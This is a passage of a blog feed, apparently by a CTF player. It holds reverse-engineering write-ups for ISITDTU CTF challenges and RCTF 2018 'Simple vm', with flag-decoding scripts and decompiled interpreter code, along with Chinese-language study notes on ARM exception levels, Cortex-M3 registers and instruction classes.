class="number">0x35C78B</span>,<span class="number">0x570489</span>]</span><br><span class="line"></span><br><span class="line">b = [<span class="number">0</span>,<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(a)):</span><br><span class="line">    <span class="keyword">if</span> (i+<span class="number">1</span> == <span class="built_in">len</span>(b)):</span><br><span class="line">        b.append(b[i] + b[i-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(a[i] ^ b[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ISITDTU&#123;This_Is_Where_Your_RE_Journey_Begin&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="simple_encrypt"><a class="markdownIt-Anchor" href="#simple_encrypt">#</a> simple_encrypt</h3>
<p>golang，反编译同样有巨大的问题</p>
<p>换表的 base64，然后有个异或 0x2a 比较明显，但是解密不对，可以猜测，发现数字不会有操作，而字母猜测前几个为 <code>Th1s</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">&#x27;Guf&#x27;</span></span><br><span class="line">b = <span class="string">&#x27;Ths&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">ord</span>(a[i]) - <span class="built_in">ord</span>(b[i]))</span><br></pre></td></tr></table></figure>
<p><img loading="lazy" data-src="ISITDTUCTF/image-20231017164530423.png" alt="image-20231017164530423"></p>
<p>差 13，猜测得到最后 exp…</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">0x6d</span>,<span class="number">0x5f</span>,<span class="number">0x1b</span>,<span class="number">0x4c</span>,<span class="number">0x75</span>,<span class="number">0x1b</span>,<span class="number">0x4c</span>,<span class="number">0x75</span>,<span class="number">0x4c</span>,<span class="number">0x1b</span>,<span class="number">0x50</span>,<span class="number">0x49</span>,<span class="number">0x53</span>,<span class="number">0x19</span>,<span class="number">0x75</span>,<span class="number">0x19</span>,<span class="number">0x4b</span>,<span class="number">0x5a</span>,<span class="number">0x4f</span>,<span class="number">0x46</span>,<span class="number">0x49</span>,<span class="number">0x4d</span>,<span class="number">0x75</span>,<span class="number">0x40</span>,<span class="number">0x1b</span>,<span class="number">0x4d</span>,<span class="number">0x5f</span>,<span class="number">0x75</span>,<span class="number">0x7e</span>,<span class="number">0x1a</span>,<span class="number">0x1a</span>,<span class="number">0x1a</span>,<span class="number">0x1a</span>,<span class="number">0x1a</span>,<span class="number">0x1a</span>,<span class="number">0x0b</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ISITDTU&#123;&#x27;</span>,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(i ^ <span class="number">0x2a</span>) <span class="keyword">in</span> <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>((((i ^ <span class="number">0x2a</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">    <span class="keyword">elif</span> <span class="built_in">chr</span>(i ^ <span class="number">0x2a</span>) <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>((((i ^ <span class="number">0x2a</span>) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) + <span class="number">13</span>) % <span class="number">26</span>) + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i ^ <span class="number">0x2a</span>)</span><br><span class="line">    <span class="comment"># flag += chr(i ^ 0x2a)</span></span><br><span class="line"><span class="built_in">print</span>(flag,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ISITDTU&#123;Th1s_1s_s1mpl3_3ncrypt_w1th_G000000!&#125;</span></span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>arm初探</title>
    <url>/2023/11/29/arm%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<h6 id="preface之前猜猜查查的感觉不彳亍了这下不得不和arm爆了"><a class="markdownIt-Anchor" href="#preface之前猜猜查查的感觉不彳亍了这下不得不和arm爆了">#</a> PREFACE：之前猜猜查查的，感觉不彳亍了，这下不得不和 arm 爆了！</h6>
<span id="more"></span>
<h3 id="架构介绍"><a class="markdownIt-Anchor" href="#架构介绍">#</a> 架构介绍</h3>
<p><img loading="lazy" data-src="arm%E5%88%9D%E6%8E%A2/V5_to_V8_Architecture.jpg" alt="img"></p>
<p><img loading="lazy" data-src="arm%E5%88%9D%E6%8E%A2/evolution_arm_arch.png" alt="img"></p>
<h5 id="架构层级"><a class="markdownIt-Anchor" href="#架构层级">#</a> 架构层级</h5>
<ul>
<li>EL0: 无特权模式 (unprivileged)</li>
<li>EL1: 作业系統核心模式 (OS kernel mode)</li>
<li>EL2: 虚拟机器监视器模式 (Hypervisor mode)</li>
<li>EL3: TrustZone(monitor mode)</li>
</ul>
<p>要提升到较高层级需要透过 exceptions (如：中断、page faults 等)。</p>
<ul>
<li>EL0 =&gt; EL1: SVC (system call)</li>
<li>EL1 =&gt; EL2: HVC (hypervisor call)</li>
<li>EL2 =&gt; EL3: SMC (secure monitor call)</li>
</ul>
<p>在转换时会将返回地址 (return address) 记录在例外连结寄存器 ELR (Exception-Link-Register)。</p>
<p>每个 EL 会有个别的 SP (stack pointer)</p>
<p>根据目前架构，由下层系統的 Execution State 決定上层系统所在模式</p>
<p>若下层系統为 32bits 則上层只能为 32bits，反之若为 64bits 則上层可为 32bits or 64bits</p>
<h5 id="安全性状态-security-state"><a class="markdownIt-Anchor" href="#安全性状态-security-state">#</a> 安全性状态 (Security state)</h5>
<p>ARMv8-A 架构提供两种安全性状态，他们有个别的实体记忆体定址空间 (Secure physical address space)。</p>
<p>安全状态 (Secure state): PE 可以存取安全及不安全的实体定址空间，有 EL0.EL1.EL3</p>
<p>不安全状态 (Non-Secure state): 只能存取不安全的实体定址空间，有 EL0.EL1.EL2</p>
<h5 id="虚拟化-virtualization"><a class="markdownIt-Anchor" href="#虚拟化-virtualization">#</a> 虚拟化 (Virtualization)</h5>
<p>这边提到的虚拟化为有实现 EL2 架构的系统。以下为其基础模型: (manual D1.5 Virtualization)</p>
<p>一个跑在 EL2 的 Hypervisor 负责切换跑在 EL1、EL0 的 virtual machines 一些跑在 virtual machines 上 (在 EL1 中) 的 Guest OS 每个 Guest OS 上跑在 EL0 的应用程序 每个 VM 会被 Hypervisor 指定一个 VMID。</p>
<p>EL2 只会实现在 Non-secure state，并负责:</p>
<p>提供虚拟值给少数特定的暂存器 (1)。Guest OS 或其上的应用程序读取这些暂存器时会得到虚拟的值。 Trapping: 当在做记忆体管理及存取其他大多数的暂存器 ((1) 之外的) 时会产生 exception 并由 EL2 处理。 Routing interrupt: 将中断分配给 现在的 Guest OS 现在没在执行的 Guest OS hypervisor (以上会在各别的章节特别探讨) 实现 EL2 包含以下实作:</p>
<p>Hypervisor Call (HVC) exception Traps to EL2 虚拟中断：包括: Virtual SError Virtual IRQ Virtual FIQ 所有虚拟中断会由 EL1 处理 每个虚拟中断可由 EL2 各别启用 每个虚拟中断都会有其对应的实体中断 当一个虚拟中断被启用时，其对应的实体中断会由 EL2 处理 (除非 EL3 指定他要处理)</p>
<p>偷了个，基本上简单入门够了</p>
<h6 id="arm内核寄存器以及常用汇编指令分析-知乎-zhihucom"><a class="markdownIt-Anchor" href="#arm内核寄存器以及常用汇编指令分析-知乎-zhihucom">#</a> <a href="https://zhuanlan.zhihu.com/p/102395838">【ARM】内核寄存器以及常用汇编指令分析 - 知乎 (zhihu.com)</a></h6>
<p><a href="https://azeria-labs.com/arm-data-types-and-registers-part-2/">ARM Data Types and Registers (Part 2) | Azeria Labs (azeria-labs.com)</a></p>
<p><a href="http://wiki.csie.ncku.edu.tw/embedded/ARMv8">Wiki - ARMv8 (ncku.edu.tw)</a> ： 这个讲的挺底层的</p>
<p><a href="https://hackmd.io/@owlfox/Bkcen7LeL/https%3A%2F%2Fhackmd.io%2Fs%2FBkGRdKmsg">ARM 指令 - HackMD</a>：这个主要偏移动设备</p>
<h3 id="常见寄存器"><a class="markdownIt-Anchor" href="#常见寄存器">#</a> 常见寄存器</h3>
<h5 id="基本寄存器结构"><a class="markdownIt-Anchor" href="#基本寄存器结构">#</a> 基本寄存器结构</h5>
<p><img loading="lazy" data-src="arm%E5%88%9D%E6%8E%A2/v2-eea3bf670b65918c3ff16d0d8c9fa552_1440w.webp" alt="img"></p>
<h5 id="r13堆栈指针stack-pointer"><a class="markdownIt-Anchor" href="#r13堆栈指针stack-pointer">#</a> R13，堆栈指针 (Stack Pointer)</h5>
<p>R13 寄存器中存放的是堆栈的栈顶指针，CM3 中有两个堆栈指针，也就支持两个堆栈。分别是：主堆栈指针 (Main Stack Pointer)，进程堆栈指针 (Process Stack Pointer)。</p>
<p>堆栈主要是通过 POP，PUSH 指令来进行操作。在执行 PUSH 和 POP 操作时，那个通常被称为 SP 的地址寄存器，会自动被调整，以避免后续的操作破坏先前的数据。</p>
<h5 id="r14-连接寄存器link-register"><a class="markdownIt-Anchor" href="#r14-连接寄存器link-register">#</a> R14 ，连接寄存器 (Link Register)</h5>
<p>在一个汇编程序中， LR 用于在调用子程序时存储返回地址。例如，在使用 BL (分支并连接， Branch and Link) 指令时，就自动填充 LR 的值 (执行函数调用的下一指令)，进而在函数退出时，正确返回并执行下一指令。</p>
<p>如果函数中又调用了其他函数，那么 LR 将会被覆盖，所以需要先将 LR 寄存器入栈 PUSH，保护起来。</p>
<h5 id="r15程序计数器program-count"><a class="markdownIt-Anchor" href="#r15程序计数器program-count">#</a> R15，程序计数器 (Program Count)</h5>
<p>因为 CM3 内部使用了指令流水线，读 PC 时返回的值是当前指令的地址 + 4</p>
<h5 id="特殊功能寄存器组"><a class="markdownIt-Anchor" href="#特殊功能寄存器组">#</a> 特殊功能寄存器组</h5>
<p>Cortex‐M3 中的特殊功能寄存器包括：</p>
<p>程序状态寄存器组（ xPSR），存放当前 CPU 的状态</p>
<p>中断屏蔽寄存器组（ PRIMASK, FAULTMASK, 以及 BASEPRI），用于控制异常的使能和除能</p>
<p>控制寄存器（ CONTROL），用于定义特权级别，以及选择当前使用堆栈指针 (PSP/MSP?)。</p>
<h5 id="cm3的操作模式"><a class="markdownIt-Anchor" href="#cm3的操作模式">#</a> CM3 的操作模式</h5>
<p>为了架构的安全性和健壮性，CM3 支持 2 个模式 (线程模式，handler 模式)，以及 2 个特权等级 (特权级，用户级)。<strong>handler 模式下只能是特权级。</strong></p>
<p><img loading="lazy" data-src="arm%E5%88%9D%E6%8E%A2/v2-a2b2ab0c1ca1dd2ccdd63d31086c51bd_1440w.webp" alt="img"></p>
<h5 id="复位序列"><a class="markdownIt-Anchor" href="#复位序列">#</a> 复位序列</h5>
<p>在进入复位状态后， CM3 做的第一件事就是读取下列两个 32 位整数的值：</p>
<p>从地址 0x0000,0000 处取出 MSP 的初始值。(<strong>初始化 MSP，为后续的代码执行创造环境</strong>)</p>
<p>从地址 0x0000,0004 处取出 PC 的初始值 — 这个值是复位向量。(<strong>启动引导代码</strong>)</p>
<p><img loading="lazy" data-src="https://pic2.zhimg.com/80/v2-75518ed58d8fc3d6b0689f0dc0f30e59_1440w.webp" alt="img"></p>
<p><img loading="lazy" data-src="arm%E5%88%9D%E6%8E%A2/v2-b05eeba8cc7c4cbded074a0aee4ebcdb_1440w.webp" alt="img"></p>
<h3 id="arm汇编指令集"><a class="markdownIt-Anchor" href="#arm汇编指令集">#</a> ARM 汇编指令集</h3>
<p><strong>ARM 指令集可以分为跳转指令、数据处理指令、程序状态寄存器 (PSR) 处理指令、加载 / 存储指令、协处理器指令和异常产生指令六大类</strong>。</p>
<p>跳转指令：B,BL,BX,BXL (<em>用于函数调用时的跳转，分为带 / 不带 返回地址 / 状态 的跳转</em>)</p>
<p>数据处理指令：MOV,ADD,SUB,DIV,MUL,AND,ORR,CMP…(<em>赋值，加减乘除，与或逻辑，比较</em>)</p>
<p>程序状态寄存器 (PSR) 处理指令：MSR,MRS (<em>用于查询或设置状态寄存器 / 特殊寄存器的数据</em>)</p>
<p>加载 / 存储指令: LDR,STR…(* 用于寄存器与内存之间的数据交换，<strong>一般为间接寻址</strong>)</p>
<p>异常产生指令：SWI (<em>用于产生软件中断</em>)</p>
]]></content>
  </entry>
  <entry>
    <title>VM</title>
    <url>/2023/03/03/VM/</url>
    <content><![CDATA[<h4 id="preface"><a class="markdownIt-Anchor" href="#preface">#</a> preface</h4>
<h6 id="its-quite-a-while-since-last-been-working-out-a-reverse-problems-when-came-into-a-vmgolang-problem-in-vnctf-i-spent-much-time-but-done-nothing-so-here-i-collect-some-vm-problems-and-tried-to-get-better-understand-of-the-thing"><a class="markdownIt-Anchor" href="#its-quite-a-while-since-last-been-working-out-a-reverse-problems-when-came-into-a-vmgolang-problem-in-vnctf-i-spent-much-time-but-done-nothing-so-here-i-collect-some-vm-problems-and-tried-to-get-better-understand-of-the-thing">#</a> It’s quite a while since last been working out a reverse problems. When came into a VM(golang) problem in VNCTF, I spent much time but done nothing. So here I collect some VM problems and tried to get better understand of the thing.</h6>
<span id="more"></span>
<h3 id="rctf-2018-simple-vm"><a class="markdownIt-Anchor" href="#rctf-2018-simple-vm">#</a> RCTF 2018 Simple vm</h3>
<p><img loading="lazy" data-src="VM%5Cmain.png" alt="main"></p>
<p>From the main function, we see that v3 read the  <code>p.bin</code>  file. By <a href="https://cplusplus.com/reference/cstdio/fseek/">searching</a>, I marked the main function like this:</p>
<p><img loading="lazy" data-src="VM%5Cmain_0.png" alt="main_0"></p>
<p>And we know that  <code>sub_400896</code>  is where VM runs. So we can add breakpoint then step in and dynamic debug the function.</p>
<p><img loading="lazy" data-src="VM%5Csub_400896.png" alt="sub_400896"></p>
<p>We can see that  <code>ptr</code>  is a address and  <code>v1[]</code>  seems like our opcode. Well, if it’s the first time you do a vm problem, you might still confuse about what happen here. Howerver, we can stimulate the program our self:</p>
<style>
pre {
  overflow-y: auto;
  max-height: 300px;
}
</style>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> length_of_file;</span><br><span class="line"><span class="type">void</span> * ptr;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">int</span> dword_6010A4;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE *v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">    FILE *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v6; <span class="comment">// rbp</span></span><br><span class="line">    <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">    v3 = <span class="built_in">fopen</span>(<span class="string">&quot;p.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    v4 = <span class="string">&quot;err 0&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    <span class="built_in">fseek</span>(v3, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">    length_of_file = <span class="built_in">ftell</span>(v5);</span><br><span class="line">    <span class="built_in">fseek</span>(v5, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = length_of_file;</span><br><span class="line">    <span class="keyword">if</span> ( length_of_file &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = <span class="string">&quot;err 1&quot;</span>;</span><br><span class="line">        LABEL_4:</span><br><span class="line">            <span class="built_in">puts</span>(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = <span class="built_in">malloc</span>(length_of_file);</span><br><span class="line">    ptr = v8;</span><br><span class="line">    v4 = <span class="string">&quot;err 3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    v4 = <span class="string">&quot;err 4&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( length_of_file != <span class="built_in">fread</span>(v8, <span class="number">1uLL</span>, v6, v5) )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="built_in">fclose</span>(v5);</span><br><span class="line">    v4 = <span class="string">&quot;err 5&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)<span class="built_in">sub_400896</span>() )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __int64 v0; <span class="comment">// rax</span></span><br><span class="line">    _BYTE *v1; <span class="comment">// rbp</span></span><br><span class="line">    <span class="type">int</span> v2; <span class="comment">// ebx</span></span><br><span class="line">    __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">    __int64 v5; <span class="comment">// rax</span></span><br><span class="line">    __int64 v6; <span class="comment">// rax</span></span><br><span class="line">    __int64 v7; <span class="comment">// rax</span></span><br><span class="line">    __int64 v8; <span class="comment">// rax</span></span><br><span class="line">    __int64 v9; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">    __int64 v11; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">char</span> v12; <span class="comment">// dl</span></span><br><span class="line">    <span class="type">int</span> v13; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">int</span> v14; <span class="comment">// eax</span></span><br><span class="line">    _BYTE *v15; <span class="comment">// rax</span></span><br><span class="line">    __int64 v16; <span class="comment">// rax</span></span><br><span class="line">    __int64 v17; <span class="comment">// rax</span></span><br><span class="line">    __int64 v18; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">    v0 = <span class="number">0LL</span>;</span><br><span class="line">    v1 = (<span class="type">unsigned</span> <span class="type">char</span>*)ptr;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v2 = v0 + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">switch</span> ( v1[v0] )</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> *(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;v1[v2];</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            v4 = v2;</span><br><span class="line">            v2 = v0 + <span class="number">9</span>;</span><br><span class="line">            v1[*(<span class="type">int</span> *)&amp;v1[v4]] = *(_DWORD *)&amp;v1[(<span class="type">int</span>)v0 + <span class="number">5</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            v5 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v6 = *(<span class="type">int</span> *)&amp;v1[v5];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            v7 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v8 = *(<span class="type">int</span> *)&amp;v1[v7];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_31;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            v9 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v10 = (<span class="type">char</span>)v1[*(<span class="type">int</span> *)&amp;v1[v9]];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            v11 = v2;</span><br><span class="line">            v12 = dword_6010A4;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v8 = *(<span class="type">int</span> *)&amp;v1[v11];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_9;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            v13 = dword_6010A4;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            v14 = ~(dword_6010A4 &amp; c);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">            v14 = <span class="built_in">getchar</span>();</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">            <span class="built_in">putchar</span>(c);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">            v15 = &amp;v1[*(<span class="type">int</span> *)&amp;v1[v2]];</span><br><span class="line">            <span class="keyword">if</span> ( *v15 )&#123;</span><br><span class="line">                v2 = *(_DWORD *)&amp;v1[v2 + <span class="number">4</span>];</span><br><span class="line">                --*v15;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                v2 += <span class="number">8</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">            ++c;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">            ++dword_6010A4;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">            v14 = dword_6010A4;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x10</span>:</span><br><span class="line">            v10 = c;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_21;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x11</span>:</span><br><span class="line">            v16 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v13 = *(_DWORD *)&amp;v1[v16];</span><br><span class="line">            LABEL_23:</span><br><span class="line">                c += v13;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x12</span>:</span><br><span class="line">            v6 = dword_6010A4;</span><br><span class="line">            <span class="keyword">goto</span> LABEL_27;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">            v6 = c;</span><br><span class="line">            LABEL_27:</span><br><span class="line">                v14 = (<span class="type">char</span>)v1[v6];</span><br><span class="line">                <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">            v17 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v14 = *(_DWORD *)&amp;v1[v17];</span><br><span class="line">            <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">            v18 = v2;</span><br><span class="line">            v2 += <span class="number">4</span>;</span><br><span class="line">            v10 = *(_DWORD *)&amp;v1[v18];</span><br><span class="line">            LABEL_21:</span><br><span class="line">                dword_6010A4 = v10;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">            v8 = dword_6010A4;</span><br><span class="line">            LABEL_31:</span><br><span class="line">                v12 = c;</span><br><span class="line">                LABEL_9:</span><br><span class="line">                    v1[v8] = v12;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x17</span>:</span><br><span class="line">            v14 = c - dword_6010A4;</span><br><span class="line">            LABEL_12:</span><br><span class="line">                c = v14;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">            <span class="keyword">if</span> ( c )</span><br><span class="line">                LABEL_35:</span><br><span class="line">                    v2 = *(_DWORD *)&amp;v1[v2];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                v2 = v0 + <span class="number">5</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ( v2 &gt;= length_of_file )</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">        v0 = v2;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>and we can add some outputs, so as to understand this program:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _BYTE unsigned char</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> _DWORD unsigned int</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">long</span> <span class="type">long</span> length_of_file;</span><br><span class="line"><span class="type">void</span> * ptr;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_400896</span><span class="params">()</span></span>;</span><br><span class="line"><span class="type">int</span> dword_6010A4;</span><br><span class="line"><span class="type">int</span> c;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ofstream outfile;</span><br><span class="line">    FILE *v3; <span class="comment">// rax</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// rdi</span></span><br><span class="line">    FILE *v5; <span class="comment">// rbx</span></span><br><span class="line">    <span class="type">size_t</span> v6; <span class="comment">// rbp</span></span><br><span class="line">    <span class="type">void</span> *v8; <span class="comment">// rax</span></span><br><span class="line">    </span><br><span class="line">    v3 = <span class="built_in">fopen</span>(<span class="string">&quot;p.bin&quot;</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    v4 = <span class="string">&quot;err 0&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v3 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    <span class="built_in">fseek</span>(v3, <span class="number">0LL</span>, <span class="number">2</span>);</span><br><span class="line">    length_of_file = <span class="built_in">ftell</span>(v5);</span><br><span class="line">    <span class="built_in">fseek</span>(v5, <span class="number">0LL</span>, <span class="number">0</span>);</span><br><span class="line">    v6 = length_of_file;</span><br><span class="line">    <span class="keyword">if</span> ( length_of_file &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        v4 = <span class="string">&quot;err 1&quot;</span>;</span><br><span class="line">        LABEL_4:</span><br><span class="line">            <span class="built_in">puts</span>(v4);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">    &#125;</span><br><span class="line">    v8 = <span class="built_in">malloc</span>(length_of_file);</span><br><span class="line">    ptr = v8;</span><br><span class="line">    v4 = <span class="string">&quot;err 3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_4;</span><br><span class="line">    v4 = <span class="string">&quot;err 4&quot;</span>;</span><br><span class="line">    